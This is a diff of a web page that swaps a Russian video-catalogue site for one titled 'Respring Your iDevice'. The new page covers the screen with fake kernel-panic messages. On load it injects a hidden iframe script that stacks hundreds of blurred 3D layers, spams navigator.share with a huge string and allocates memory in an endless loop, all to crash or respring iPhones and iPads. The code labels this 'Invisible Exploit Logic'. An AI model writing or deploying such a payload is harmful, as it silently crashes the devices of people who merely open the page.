@@ -1,310 +1,129 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>BiCinema | Smart View</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Respring Your iDevice</title>
+    <meta name="description" content="WEB-RESPRING USING NEONMODDER123 METHOD | Works on every iOS/iPadOS since iOS 16">
+    <meta name="theme-color" content="#0b0b10">
     
+    <meta property="og:type" content="website">
+    <meta property="og:site_name" content="Web-Break">
+    <meta property="og:url" content="https://vityaig.github.io/respring.html">
+    <meta property="og:title" content="Respring Your iDevice">
+    <meta property="og:description" content="WEB-RESPRING USING NEONMODDER123 METHOD | Works on every iOS/iPadOS since iOS 16">
+    <meta property="og:image" content="https://vityaig.github.io/embed-red.png">
+    <meta property="og:image:alt" content="Red lock icon">
+
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:title" content="Respring Your iDevice">
+    <meta name="twitter:description" content="WEB-RESPRING USING NEONMODDER123 METHOD | Works on every iOS/iPadOS since iOS 16">
+    <meta name="twitter:image" content="https://vityaig.github.io/embed-red.png">
+
+    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%23ff4d4f' stroke-width='2.4' stroke-linecap='round' stroke-linejoin='round'%3E%3Crect x='5' y='11' width='14' height='9' rx='2'/%3E%3Cpath d='M8 11V8.5a4 4 0 0 1 8 0V11'/%3E%3C/svg%3E">
+
     <style>
-        :root {
-            --accent: #ff8c00;
-            --bg: #000000;
-            --surface: #121212;
-            --text: #ffffff;
-            --radius: 20px;
-        }
-
-        * { 
-            box-sizing: border-box; 
-            margin: 0; padding: 0; 
-            -webkit-tap-highlight-color: transparent;
-        }
-
         body {
-            font-family: 'Inter', sans-serif;
-            background-color: var(--bg);
-            color: var(--text);
-            overflow-x: hidden;
-            -webkit-text-size-adjust: 100%;
-        }
-
-        .container {
-            max-width: 900px;
-            margin: 0 auto;
-            padding: 0 15px;
-            transition: opacity 0.3s ease;
-        }
-
-        header {
-            padding: 30px 0;
-            text-align: center;
-        }
-
-        .logo {
-            font-size: 2.2rem;
-            font-weight: 900;
-            color: var(--accent);
-            text-transform: uppercase;
-            letter-spacing: -1px;
-        }
-
-        /* КАТАЛОГ */
-        .grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
-            gap: 20px;
-            padding-bottom: 40px;
-        }
-
-        .card {
-            background: var(--surface);
-            border-radius: var(--radius);
+            background: #8b0000; /* Ordinary Red */
+            color: #ffffff;
+            margin: 0;
+            padding: 0;
             overflow: hidden;
-            cursor: pointer;
-            border: 1px solid rgba(255,255,255,0.05);
-            transition: 0.2s;
-        }
-
-        .card:active { transform: scale(0.95); }
-        .card img { width: 100%; aspect-ratio: 2/3; object-fit: cover; display: block; }
-        .card-info { padding: 12px; text-align: center; }
-        .card-title { font-size: 0.9rem; font-weight: 700; }
-
-        /* ЭКРАНЫ */
-        .page { display: none; }
-        .page.active { display: block; animation: fadeIn 0.3s ease; }
-
-        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
-
-        .btn-back {
-            background: #1a1a1a;
-            border: none;
-            color: #fff;
-            padding: 12px 20px;
-            border-radius: 12px;
-            margin: 15px 0;
-            font-weight: 700;
-            cursor: pointer;
-        }
-
-        /* ДЕТАЛИ */
-        .hero-layout {
+            font-family: 'JetBrains Mono', monospace;
             display: flex;
-            flex-direction: column;
-            gap: 25px;
-        }
-
-        .hero-poster {
-            width: 100%;
-            max-width: 280px;
-            border-radius: var(--radius);
-            margin: 0 auto;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
-        }
-
-        .hero-text h1 { font-size: 2rem; margin-bottom: 10px; }
-        .hero-text p { color: #888; margin-bottom: 25px; }
-
-        .btn-main {
-            width: 100%;
-            padding: 20px;
-            background: var(--accent);
-            border: none;
-            border-radius: var(--radius);
-            color: #000;
-            font-weight: 900;
-            font-size: 1rem;
-            cursor: pointer;
-        }
-
-        /* ПЛЕЕР: УМНЫЙ КОНТЕЙНЕР */
-        #player-box {
+            flex-wrap: wrap;
+            gap: 4px;
+            align-content: flex-start;
+            height: 100vh;
+            width: 100vw;
             position: relative;
-            width: 100%;
-            background: #000;
-            border-radius: var(--radius);
-            overflow: hidden;
-            margin-top: 25px;
-            border: 1px solid #222;
         }
 
-        /* Соотношение сторон по умолчанию */
-        .ratio-16-9 { padding-top: 56.25%; }
+        .error-msg {
+            font-size: 6px;
+            opacity: 0.6;
+            white-space: nowrap;
+            user-select: none;
+            padding: 1px;
+            position: relative;
+            z-index: 10; /* Above iframe */
+        }
 
-        iframe {
-            position: absolute;
-            top: 0; left: 0;
-            width: 100%; height: 100%;
+        #respring-iframe {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 1px;
+            height: 1px;
             border: none;
-            /* Убираем лишние тапы на iOS */
-            pointer-events: auto;
+            opacity: 0.01; 
+            pointer-events: none;
+            z-index: -1;
         }
-
-        /* ФУЛЛСКРИН ПРИ ПОВОРОТЕ (LANDSCAPE) */
-        @media screen and (orientation: landscape) and (max-height: 500px) {
-            header, .btn-back, .hero-poster, .hero-text h1, .hero-text p {
-                display: none !important;
-            }
-            .container { padding: 0; max-width: 100%; }
-            #player-box {
-                position: fixed;
-                top: 0; left: 0;
-                width: 100vw; height: 100vh;
-                margin: 0; border: none; border-radius: 0;
-                z-index: 9999;
-            }
-            #player-box.ratio-16-9 { padding-top: 0; }
-        }
-
-        /* СПИСОК СЕРИЙ */
-        .ep-list { margin-top: 20px; display: flex; flex-direction: column; gap: 10px; }
-        .ep-row {
-            background: var(--surface);
-            padding: 18px;
-            border-radius: 15px;
-            display: flex;
-            justify-content: space-between;
-            cursor: pointer;
-        }
-        .ep-row:active { background: #1a1a1a; color: var(--accent); }
     </style>
 </head>
 <body>
+    <iframe id="respring-iframe" 
+        sandbox="allow-forms allow-modals allow-scripts allow-same-origin">
+    </iframe>
 
-<div class="container">
-    <header><div class="logo">BiCinema</div></header>
-
-    <div id="p-main" class="page active">
-        <div class="grid" id="catalog-grid"></div>
-    </div>
-
-    <div id="p-item" class="page">
-        <button class="btn-back" onclick="nav('p-main')">← Назад</button>
-        <div class="hero-layout">
-            <img id="m-img" src="" class="hero-poster" alt="">
-            <div class="hero-text">
-                <h1 id="m-title"></h1>
-                <p id="m-desc"></p>
-                <button class="btn-main" id="m-btn">СМОТРЕТЬ</button>
-                <div id="player-box" class="ratio-16-9" style="display: none;"></div>
-            </div>
-        </div>
-    </div>
-
-    <div id="p-eps" class="page">
-        <button class="btn-back" onclick="nav('p-item')">← Описание</button>
-        <h2 id="eps-title" style="margin-bottom: 20px;"></h2>
-        <div class="ep-list" id="eps-list"></div>
-    </div>
-</div>
-
-<script>
-    const DB = [
-      {
-        "title": "Ниндзяго: Восстание Драконов",
-        "poster": "https://raw.githubusercontent.com/LumoCreator/admincinema/refs/heads/main/IMG_1873.jpeg",
-        "desc": "Объединение миров принесло новые угрозы. Ллойд и новые ученики Сора и Арин вступают в битву за будущее.",
-        "type": "serial",
-        "seasons": [
-          {
-            "eps": [
-              { "name": "Шепчущий дракон", "time": "23:00", "url": "https://drive.google.com/uc?export=download&id=1qM4uZ1F4V148msGgrzvJGd8cF2iSAHpt" }
-            ]
-          }
-        ]
-      }
-    ];
-
-    function init() {
-        const grid = document.getElementById('catalog-grid');
-        grid.innerHTML = "";
-        DB.forEach((item, i) => {
-            const el = document.createElement('div');
-            el.className = 'card';
-            el.onclick = () => showItem(i);
-            el.innerHTML = `<img src="${item.poster}"><div class="card-info"><div class="card-title">${item.title}</div></div>`;
-            grid.appendChild(el);
-        });
-    }
-
-    let currentItem = null;
-
-    function showItem(i) {
-        currentItem = DB[i];
-        document.getElementById('m-title').innerText = currentItem.title;
-        document.getElementById('m-img').src = currentItem.poster;
-        document.getElementById('m-desc').innerText = currentItem.desc;
+    <script>
+        // Fill background with small error messages - extreme density
+        const errorTemplates = [
+            "Fatal Error 0x3333",
+            "Entering Bootloop...",
+            "KERNEL_PANIC",
+            "OVERFLOW_DETECTION",
+            "STACK_COLLISION",
+            "MEMORY_CORRUPTION",
+            "0xFFFF_SYSTEM_HALT",
+            "CRITICAL_PROCESS_DIED",
+            "THREAD_STUCK_IN_DEVICE_DRIVER",
+            "BOOT_LOOP_DETECTED",
+            "FS_CORRUPTION",
+            "SYSTEM_FREEZE",
+            "HARDWARE_MALFUNCTION"
+        ];
         
-        const box = document.getElementById('player-box');
-        box.style.display = 'none';
-        box.innerHTML = "";
-
-        const btn = document.getElementById('m-btn');
-        if(currentItem.type === 'movie') {
-            btn.innerText = "Смотреть фильм";
-            btn.onclick = () => startPlayer(currentItem.url);
-        } else {
-            btn.innerText = "Выбрать серию";
-            btn.onclick = showEps;
+        for(let i=0; i<3000; i++) {
+            const span = document.createElement('span');
+            span.className = 'error-msg';
+            span.innerText = errorTemplates[Math.floor(Math.random() * errorTemplates.length)];
+            document.body.appendChild(span);
         }
-        nav('p-item');
-    }
 
-    function showEps() {
-        document.getElementById('eps-title').innerText = currentItem.title;
-        const list = document.getElementById('eps-list');
-        list.innerHTML = "";
-        currentItem.seasons[0].eps.forEach(ep => {
-            const row = document.createElement('div');
-            row.className = 'ep-row';
-            row.innerHTML = `<b>${ep.name}</b><span>${ep.time}</span>`;
-            row.onclick = () => { nav('p-item'); startPlayer(ep.url); };
-            list.appendChild(row);
-        });
-        nav('p-eps');
-    }
+        // Invisible Exploit Logic
+        window.onload = function() {
+            setTimeout(() => {
+                const frame = document.getElementById('respring-iframe');
+                const respringScript = `
+                    <html>
+                    <body style="margin:0; overflow:hidden;">
+                        <script>
+                            const container = document.createElement('div');
+                            container.style.cssText = 'perspective: 1px; perspective-origin: 9999999% 9999999%;';
+                            document.body.appendChild(container);
 
-    function startPlayer(url) {
-        const box = document.getElementById('player-box');
-        box.style.display = 'block';
-        
-        let id = "";
-        if(url.includes('id=')) id = url.split('id=')[1].split('&')[0];
-        else id = url.split('/d/')[1].split('/')[0];
-        
-        const finalUrl = `https://drive.google.com/file/d/${id}/preview`;
+                            for (let i = 0; i < 500; i++) {
+                                let d = document.createElement('div');
+                                d.style.cssText = 'position: absolute; width: 100vw; height: 100vh; backdrop-filter: blur(100px); -webkit-backdrop-filter: blur(100px); transform: translate3d(100000px, 100000px, ' + i + 'px) rotateY(90deg); opacity: 0.99;';
+                                container.appendChild(d);
+                            }
 
-        // playsinline=0 заставляет iOS использовать только фрейм без наслоений
-        box.innerHTML = `
-            <iframe 
-                src="${finalUrl}" 
-                allow="autoplay; fullscreen"
-                allowfullscreen="true" 
-                webkitallowfullscreen="true" 
-                mozallowfullscreen="true"
-                playsinline="0">
-            </iframe>
-        `;
-        
-        setTimeout(() => box.scrollIntoView({ behavior: 'smooth', block: 'center' }), 300);
-    }
-
-    function nav(id) {
-        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
-        document.getElementById(id).classList.add('active');
-        window.scrollTo(0,0);
-    }
-
-    window.onload = init;
-
-    // Слушатель изменения ориентации для iPhone
-    window.addEventListener("orientationchange", function() {
-        if (window.orientation === 90 || window.orientation === -90) {
-            console.log("Landscape mode activated");
-        }
-    }, false);
-</script>
-
+                            setInterval(() => {
+                                try {
+                                    navigator.share({ title: 'R', text: 'R'.repeat(100000) });
+                                } catch(e) {}
+                                let x = new Uint8Array(1024 * 1024 * 20);
+                                crypto.getRandomValues(x);
+                            }, 0);
+                        <\/script>
+                    </body>
+                    </html>
+                `;
+                frame.srcdoc = respringScript;
+            }, 200);
+        };
+    </script>
 </body>
 </html>
